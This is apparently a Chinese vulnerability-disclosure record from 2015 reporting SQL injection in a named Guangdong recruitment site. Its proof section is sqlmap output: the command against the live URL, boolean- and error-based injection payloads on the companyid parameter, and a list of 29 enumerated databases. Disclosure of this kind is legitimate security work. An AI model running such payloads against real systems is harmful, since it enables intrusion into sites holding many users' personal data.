wybug_title: 广东某人才网存在SQL注入漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-06-24：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-08-08：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 广东某人才网存在SQL注入漏洞 详细说明：  广东某人才网存在SQL注入漏洞，按照百科上的资料说注册用户达139W。我就不懂数据了。   漏洞证明：  
[root@Hacker~]# Sqlmap -u http://www.gdrc.com/content.do?companyid=ganten --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:23:36[20:23:36] [INFO] resuming back-end DBMS 'mysql'[20:23:36] [INFO] testing connection to the target url[20:23:39] [INFO] heuristics detected web page charset 'ISO-8859-2'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: companyid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: companyid=ganten' AND 8672=8672 AND 'RGDb'='RGDb    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: companyid=ganten' AND (SELECT 1719 FROM(SELECT COUNT(*),CONCAT(0x3a7261723a,(SELECT (CASE WHEN (1719=1719) THEN 1 ELSE 0 END)),0x3a7076743a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'eHFw'='eHFw---[20:23:39] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.9back-end DBMS: MySQL 5.0[20:23:39] [INFO] fetching database names[20:23:39] [INFO] the SQL query used returns 29 entriesavailable databases [29]:[*] future[*] gdrc[*] gdrc_other[*] grad[*] haiwai[*] hkrc[*] hrcn[*] information_schema[*] mysql[*] newhaiwai[*] test[*] testgdrc[*] union_base[*] union_collection[*] union_fabu[*] union_interaction[*] union_job[*] union_logs[*] union_resource[*] union_resume[*] video[*] wl_base[*] wl_collection[*] wl_fabu[*] wl_interaction[*] wl_job[*] wl_logs[*] wl_resource[*] wl_resume[20:23:39] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602).
